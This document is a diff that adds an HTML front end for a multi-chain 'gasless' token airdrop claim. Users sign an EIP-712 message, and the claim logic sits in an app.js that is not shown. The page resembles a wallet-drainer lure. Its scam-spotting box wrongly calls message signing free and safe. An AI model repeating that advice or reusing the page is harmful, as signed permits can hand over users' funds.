@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legitimate Airdrop - Gasless Multi-Chain Claim</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; background: #0a0e1a; }
+        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); }
+        .gradient-text { background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .chain-card { transition: all 0.3s ease; }
+        .chain-card:hover { transform: translateY(-4px); }
+        .chain-card.active { border-color: #667eea; background: rgba(102, 126, 234, 0.1); }
+        .wallet-modal { animation: slideUp 0.3s ease-out; }
+        @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .pulse-ring { animation: pulse-ring 2s cubic-bezier(0.215, 0.61, 0.355, 1) infinite; }
+        @keyframes pulse-ring { 0% { transform: scale(0.8); opacity: 0.8; } 100% { transform: scale(2); opacity: 0; } }
+        .toast { animation: toastIn 0.4s ease-out; }
+        @keyframes toastIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+    </style>
+</head>
+<body class="min-h-screen text-white overflow-x-hidden">
+    <div id="toastContainer" class="fixed top-4 right-4 z-[100] space-y-2"></div>
+    <nav class="fixed w-full z-50 glass border-b border-slate-800/50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex items-center space-x-3">
+                    <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-indigo-500 via-purple-500 to-pink-500 flex items-center justify-center shadow-lg shadow-indigo-500/30">
+                        <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    </div>
+                    <span class="font-bold text-xl tracking-tight">AirdropClaim</span>
+                </div>
+                <div class="flex items-center space-x-4">
+                    <div id="networkBadge" class="hidden items-center space-x-2 px-3 py-1.5 rounded-full bg-slate-800 border border-slate-700 text-xs font-medium">
+                        <div class="w-2 h-2 rounded-full bg-green-400"></div>
+                        <span id="currentNetwork">Ethereum</span>
+                    </div>
+                    <div id="walletDisplay" class="hidden items-center space-x-2 px-4 py-2 rounded-full bg-slate-800 border border-slate-600 hover:bg-slate-700 cursor-pointer transition-colors">
+                        <div class="w-2 h-2 rounded-full bg-green-400"></div>
+                        <span id="walletAddress" class="text-sm font-mono"></span>
+                        <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+    <div class="relative pt-32 pb-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
+        <div class="absolute top-20 left-1/2 -translate-x-1/2 w-[500px] h-[500px] bg-indigo-500/10 rounded-full blur-3xl"></div>
+        <div class="absolute top-40 right-1/4 w-[300px] h-[300px] bg-purple-500/10 rounded-full blur-3xl"></div>
+        <div class="relative text-center max-w-3xl mx-auto">
+            <div class="inline-flex items-center px-4 py-2 rounded-full bg-indigo-500/10 border border-indigo-500/20 text-indigo-300 text-sm font-medium mb-6">
+                <span class="w-2 h-2 rounded-full bg-indigo-400 mr-2 animate-pulse"></span>
+                Multi-Chain Gasless Claims Live
+            </div>
+            <h1 class="text-5xl sm:text-7xl font-bold mb-6 leading-tight">
+                Claim Your <span class="gradient-text">LEGIT Tokens</span><br>
+                <span class="text-3xl sm:text-5xl text-slate-400 font-light">Zero Gas. Any Chain. Any Wallet.</span>
+            </h1>
+            <p class="text-lg text-slate-400 mb-10 max-w-2xl mx-auto leading-relaxed">
+                Connect any wallet. Sign a free message and receive tokens instantly. We pay all gas fees.
+            </p>
+            <div class="flex flex-wrap justify-center gap-3 mb-12">
+                <div class="flex items-center space-x-2 px-4 py-2 rounded-lg bg-slate-800/50 border border-slate-700/50">
+                    <svg class="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                    <span class="text-sm text-slate-300">Audited Contract</span>
+                </div>
+                <div class="flex items-center space-x-2 px-4 py-2 rounded-lg bg-slate-800/50 border border-slate-700/50">
+                    <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                    <span class="text-sm text-slate-300">EIP-712 Signatures</span>
+                </div>
+                <div class="flex items-center space-x-2 px-4 py-2 rounded-lg bg-slate-800/50 border border-slate-700/50">
+                    <svg class="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
+                    <span class="text-sm text-slate-300">Relayer Pays Gas</span>
+                </div>
+                <div class="flex items-center space-x-2 px-4 py-2 rounded-lg bg-slate-800/50 border border-slate-700/50">
+                    <svg class="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"></path></svg>
+                    <span class="text-sm text-slate-300">500+ Wallets</span>
+                </div>
+            </div>
+        </div>
+        <div class="max-w-lg mx-auto">
+            <div class="glass rounded-2xl border border-slate-700/50 p-1 shadow-2xl shadow-indigo-500/5">
+                <div class="bg-slate-900/50 rounded-xl p-6 sm:p-8">
+                    <div class="mb-6">
+                        <label class="block text-sm font-medium text-slate-400 mb-3">Select Network</label>
+                        <div class="grid grid-cols-3 gap-2" id="chainSelector"></div>
+                    </div>
+                    <div id="notConnected" class="text-center">
+                        <div class="w-20 h-20 mx-auto mb-6 rounded-2xl bg-gradient-to-br from-slate-700 to-slate-800 flex items-center justify-center border border-slate-600 relative">
+                            <svg class="w-10 h-10 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+                            <div class="absolute -bottom-1 -right-1 w-6 h-6 rounded-full bg-green-500 border-2 border-slate-900 flex items-center justify-center">
+                                <svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                            </div>
+                        </div>
+                        <h3 class="text-xl font-semibold mb-2">Connect Your Wallet</h3>
+                        <p class="text-slate-400 text-sm mb-6">MetaMask, Rainbow, Trust, Phantom, Coinbase, and 500+ more supported</p>
+                        <button onclick="openWalletModal()" class="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-indigo-600 via-purple-600 to-pink-600 hover:from-indigo-500 hover:via-purple-500 hover:to-pink-500 text-white font-semibold text-lg transition-all duration-200 flex items-center justify-center space-x-2 shadow-lg shadow-indigo-500/25 hover:shadow-indigo-500/40 hover:-translate-y-0.5">
+                            <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+                            <span>Connect Wallet</span>
+                        </button>
+                        <div class="mt-4 flex items-center justify-center space-x-2 text-xs text-slate-500">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                            <span>We never access your private keys</span>
+                        </div>
+                    </div>
+                    <div id="connected" class="hidden">
+                        <div class="flex items-center justify-between mb-6 pb-6 border-b border-slate-700/50">
+                            <div>
+                                <p class="text-sm text-slate-400">Your Allocation</p>
+                                <p class="text-3xl font-bold text-white">1,000 <span class="text-lg text-indigo-400">LEGIT</span></p>
+                            </div>
+                            <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-indigo-500/20 to-purple-500/20 flex items-center justify-center border border-indigo-500/30">
+                                <span class="text-3xl">🎁</span>
+                            </div>
+                        </div>
+                        <div class="space-y-3 mb-6">
+                            <div class="flex justify-between text-sm items-center">
+                                <span class="text-slate-400">Network</span>
+                                <span class="flex items-center space-x-2">
+                                    <span id="selectedChainIcon" class="w-4 h-4 rounded-full"></span>
+                                    <span id="selectedChainName" class="text-green-400 font-medium">Ethereum</span>
+                                </span>
+                            </div>
+                            <div class="flex justify-between text-sm">
+                                <span class="text-slate-400">Gas Fee</span>
+                                <span class="text-green-400 font-medium">$0.00 (Covered)</span>
+                            </div>
+                            <div class="flex justify-between text-sm">
+                                <span class="text-slate-400">Claim Status</span>
+                                <span id="claimStatus" class="text-yellow-400 font-medium">Available</span>
+                            </div>
+                        </div>
+                        <button id="claimBtn" onclick="claimTokens()" class="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 text-white font-semibold text-lg transition-all duration-200 flex items-center justify-center space-x-2 shadow-lg shadow-green-500/20 hover:shadow-green-500/30 hover:-translate-y-0.5">
+                            <span id="claimBtnText">Claim 1,000 LEGIT</span>
+                            <svg id="claimBtnSpinner" class="hidden w-5 h-5 animate-spin" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                        </button>
+                        <div class="mt-4 p-4 rounded-xl bg-slate-800/50 border border-slate-700/50">
+                            <p class="text-xs text-slate-400 leading-relaxed">
+                                <strong class="text-slate-300">How it works:</strong> You will sign a free EIP-712 message. Our relayer submits the blockchain transaction and pays the gas fee. You pay nothing.
+                            </p>
+                        </div>
+                    </div>
+                    <div id="success" class="hidden text-center py-8">
+                        <div class="relative w-28 h-28 mx-auto mb-6">
+                            <div class="absolute inset-0 rounded-full bg-green-500/20 pulse-ring"></div>
+                            <div class="relative w-28 h-28 rounded-full bg-gradient-to-br from-green-500/20 to-emerald-500/20 flex items-center justify-center border-2 border-green-500">
+                                <svg class="w-14 h-14 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                            </div>
+                        </div>
+                        <h3 class="text-2xl font-bold text-white mb-2">Claim Successful!</h3>
+                        <p class="text-slate-400 mb-6">1,000 LEGIT tokens have been sent to your wallet</p>
+                        <div class="flex flex-col sm:flex-row gap-3 justify-center">
+                            <a id="txLink" href="#" target="_blank" class="inline-flex items-center justify-center space-x-2 px-6 py-3 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white transition-colors">
+                                <span>View on Explorer</span>
+                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>
+                            </a>
+                            <button onclick="resetClaim()" class="inline-flex items-center justify-center space-x-2 px-6 py-3 rounded-xl bg-slate-700 hover:bg-slate-600 text-white transition-colors">
+                                <span>Claim Again</span>
+                            </button>
+                        </div>
+                    </div>
+                    <div id="error" class="hidden text-center py-4">
+                        <div class="w-16 h-16 mx-auto mb-4 rounded-full bg-red-500/20 flex items-center justify-center">
+                            <svg class="w-8 h-8 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                        </div>
+                        <p id="errorMessage" class="text-red-400 font-medium"></p>
+                        <button onclick="resetClaim()" class="mt-4 text-sm text-slate-400 hover:text-white underline">Try Again</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="mt-20 max-w-5xl mx-auto">
+            <h2 class="text-2xl font-bold text-center mb-12">How Gasless Multi-Chain Claims Work</h2>
+            <div class="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
+                <div class="text-center p-6 rounded-2xl bg-slate-800/30 border border-slate-700/50 hover:border-indigo-500/30 transition-colors">
+                    <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold text-xl">1</div>
+                    <h3 class="font-semibold mb-2">Select Chain</h3>
+                    <p class="text-sm text-slate-400">Choose Ethereum, Polygon, Arbitrum, BSC, or Base.</p>
+                </div>
+                <div class="text-center p-6 rounded-2xl bg-slate-800/30 border border-slate-700/50 hover:border-purple-500/30 transition-colors">
+                    <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-purple-500/20 flex items-center justify-center text-purple-400 font-bold text-xl">2</div>
+                    <h3 class="font-semibold mb-2">Sign Message</h3>
+                    <p class="text-sm text-slate-400">Sign a free EIP-712 typed message. Zero gas cost.</p>
+                </div>
+                <div class="text-center p-6 rounded-2xl bg-slate-800/30 border border-slate-700/50 hover:border-pink-500/30 transition-colors">
+                    <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-pink-500/20 flex items-center justify-center text-pink-400 font-bold text-xl">3</div>
+                    <h3 class="font-semibold mb-2">Relayer Submits</h3>
+                    <p class="text-sm text-slate-400">Our relayer submits the transaction and pays gas.</p>
+                </div>
+                <div class="text-center p-6 rounded-2xl bg-slate-800/30 border border-slate-700/50 hover:border-green-500/30 transition-colors">
+                    <div class="w-12 h-12 mx-auto mb-4 rounded-xl bg-green-500/20 flex items-center justify-center text-green-400 font-bold text-xl">4</div>
+                    <h3 class="font-semibold mb-2">Receive Tokens</h3>
+                    <p class="text-sm text-slate-400">Smart contract verifies and transfers tokens.</p>
+                </div>
+            </div>
+        </div>
+        <div class="mt-20 max-w-4xl mx-auto text-center">
+            <h2 class="text-2xl font-bold mb-8">Supported Wallets</h2>
+            <div class="flex flex-wrap justify-center gap-4">
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-orange-500/20 flex items-center justify-center text-orange-400 font-bold text-xs">MM</div><span class="text-sm font-medium">MetaMask</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-blue-500/20 flex items-center justify-center text-blue-400 font-bold text-xs">WC</div><span class="text-sm font-medium">WalletConnect</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-blue-600/20 flex items-center justify-center text-blue-500 font-bold text-xs">CB</div><span class="text-sm font-medium">Coinbase</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center text-purple-400 font-bold text-xs">RB</div><span class="text-sm font-medium">Rainbow</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-blue-400/20 flex items-center justify-center text-blue-400 font-bold text-xs">TW</div><span class="text-sm font-medium">Trust Wallet</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-purple-600/20 flex items-center justify-center text-purple-500 font-bold text-xs">PH</div><span class="text-sm font-medium">Phantom</span></div>
+                <div class="flex items-center space-x-2 px-5 py-3 rounded-xl bg-slate-800/30 border border-slate-700/50"><div class="w-8 h-8 rounded-lg bg-indigo-500/20 flex items-center justify-center text-indigo-400 font-bold text-xs">500+</div><span class="text-sm font-medium">More Wallets</span></div>
+            </div>
+        </div>
+        <div class="mt-20 max-w-3xl mx-auto p-8 rounded-2xl bg-gradient-to-br from-slate-800/50 to-slate-900/50 border border-slate-700/50">
+            <h3 class="text-xl font-bold mb-6 flex items-center">
+                <svg class="w-6 h-6 text-yellow-400 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
+                How to Spot Scam Airdrops
+            </h3>
+            <div class="grid sm:grid-cols-2 gap-4 text-sm">
+                <div class="flex items-start space-x-3 p-3 rounded-lg bg-red-500/5 border border-red-500/10">
+                    <svg class="w-5 h-5 text-red-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    <span class="text-slate-300"><strong class="text-red-400">Scam:</strong> Asks you to send crypto to "cover gas"</span>
+                </div>
+                <div class="flex items-start space-x-3 p-3 rounded-lg bg-green-500/5 border border-green-500/10">
+                    <svg class="w-5 h-5 text-green-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    <span class="text-slate-300"><strong class="text-green-400">Legit:</strong> Only asks you to sign a message (free)</span>
+                </div>
+                <div class="flex items-start space-x-3 p-3 rounded-lg bg-red-500/5 border border-red-500/10">
+                    <svg class="w-5 h-5 text-red-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    <span class="text-slate-300"><strong class="text-red-400">Scam:</strong> Requests unlimited token approval</span>
+                </div>
+                <div class="flex items-start space-x-3 p-3 rounded-lg bg-green-500/5 border border-green-500/10">
+                    <svg class="w-5 h-5 text-green-400 mt-0.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                    <span class="text-slate-300"><strong class="text-green-400">Legit:</strong> Clear transaction details shown</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="border-t border-slate-800/50 mt-20 py-12 text-center text-slate-500 text-sm">
+        <p class="mb-2">This is a demonstration of legitimate gasless multi-chain claim architecture.</p>
+        <p>Always verify smart contracts and never share your private keys or seed phrases.</p>
+    </footer>
+    <div id="walletModal" class="fixed inset-0 z-[60] hidden">
+        <div class="absolute inset-0 bg-black/60 backdrop-blur-sm" onclick="closeWalletModal()"></div>
+        <div class="absolute bottom-0 sm:bottom-auto sm:top-1/2 sm:left-1/2 sm:-translate-x-1/2 sm:-translate-y-1/2 w-full sm:w-[420px] sm:rounded-2xl rounded-t-2xl bg-slate-900 border border-slate-700 shadow-2xl wallet-modal">
+            <div class="p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-lg font-semibold">Connect Wallet</h3>
+                    <button onclick="closeWalletModal()" class="text-slate-400 hover:text-white">
+                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                    </button>
+                </div>
+                <div class="space-y-3" id="walletOptions">
+                    <button onclick="connectMetaMask()" class="w-full flex items-center space-x-4 p-4 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-indigo-500/50 transition-all group">
+                        <div class="w-10 h-10 rounded-lg bg-orange-500/20 flex items-center justify-center"><span class="text-orange-400 font-bold text-sm">🦊</span></div>
+                        <div class="text-left flex-1"><p class="font-medium group-hover:text-indigo-300 transition-colors">MetaMask</p><p class="text-xs text-slate-400">Browser Extension</p></div>
+                        <svg class="w-5 h-5 text-slate-500 group-hover:text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                    </button>
+                    <button onclick="connectWalletConnect()" class="w-full flex items-center space-x-4 p-4 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-indigo-500/50 transition-all group">
+                        <div class="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center"><span class="text-blue-400 font-bold text-sm">📱</span></div>
+                        <div class="text-left flex-1"><p class="font-medium group-hover:text-indigo-300 transition-colors">WalletConnect v2</p><p class="text-xs text-slate-400">500+ Mobile & Desktop Wallets</p></div>
+                        <svg class="w-5 h-5 text-slate-500 group-hover:text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                    </button>
+                    <button onclick="connectCoinbase()" class="w-full flex items-center space-x-4 p-4 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 hover:border-indigo-500/50 transition-all group">
+                        <div class="w-10 h-10 rounded-lg bg-blue-600/20 flex items-center justify-center"><span class="text-blue-500 font-bold text-sm">🅒</span></div>
+                        <div class="text-left flex-1"><p class="font-medium group-hover:text-indigo-300 transition-colors">Coinbase Wallet</p><p class="text-xs text-slate-400">Mobile App & Extension</p></div>
+                        <svg class="w-5 h-5 text-slate-500 group-hover:text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
+                    </button>
+                </div>
+                <div id="wcQrDisplay" class="hidden text-center py-4">
+                    <div id="wcQrCode" class="w-64 h-64 mx-auto mb-4 bg-white rounded-xl p-4"></div>
+                    <p class="text-sm text-slate-400 mb-2">Scan with your wallet app</p>
+                    <p class="text-xs text-slate-500">Or copy the URI below</p>
+                    <div class="mt-3 flex items-center space-x-2">
+                        <input id="wcUri" type="text" readonly class="flex-1 bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-400 font-mono" value="">
+                        <button onclick="copyWcUri()" class="px-3 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-xs font-medium transition-colors">Copy</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.10.0/dist/umd/index.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <script src="app.js"></script>
+</body>
+</html>
